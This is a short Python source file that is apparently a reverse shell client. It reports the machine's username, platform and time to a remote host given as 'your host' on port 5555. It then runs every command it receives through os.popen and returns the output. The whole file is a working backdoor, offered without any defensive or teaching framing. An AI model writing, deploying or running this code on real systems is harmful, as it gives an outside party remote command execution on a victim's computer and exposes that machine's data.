import os
import time
import socket
import platform
import threading


class Sock_Client():

    def __init__(self):
        self.whois = os.popen("whoami").read()
        self.platform = platform.system()
        self.time = time.ctime()
        self.host = "your host"
        self.port = 5555
        self.structure = (f"---Computer--- : {self.whois}\n"
                          f"---Data Time--- : {self.time}\n"
                          f"---Platform--- : {self.platform}\n"
)
        self.buffer = 1080

    def sock(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        
        try:
            sock.send(self.structure.encode())

            while True:
                
                mesage = sock.recv(self.buffer).decode()
                output = os.popen(mesage).read()
                
                
                sock.sendall(output.encode())

        except BrokenPipeError as err:
            print(f"Error in the server {err}")

        




if __name__ == "__main__":
    funtion = Sock_Client()
    funtion.sock()
